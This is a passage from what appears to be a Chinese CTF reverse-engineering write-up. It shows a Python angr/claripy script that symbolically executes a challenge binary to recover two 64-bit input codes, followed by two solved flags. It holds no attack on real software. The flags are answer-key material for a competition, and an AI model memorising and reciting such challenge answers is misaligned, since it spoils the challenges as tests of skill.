    start = base + get_addr(file)

    p = angr.Project(file)

    init = p.factory.blank_state(addr = start)

    code1 = claripy.BVS('code1', 64)
    code2 = claripy.BVS('code2', 64)

    init.regs.rsi = code1
    init.regs.rdi = code2

    sim = p.factory.simgr(init)
    sim.explore(find=succ, avoid=fail)

    if len(sim.found) > 0:
        res = sim.found[0]
        a = res.solver.eval(code1)
        b = res.solver.eval(code2)
        result = bytes.fromhex(hex(a)[2:] + hex(b)[2:])[::-1]
        return result
    return 'Error!'
```

以此传入文件，就可以自动求解了，自动化真好，可以躺平了！

**flag{ESREVER_6224fc5dc9b92d57}**

**flag{Half_Bl00d_Automata_f2b40c2602965ee1}**

---

THE END
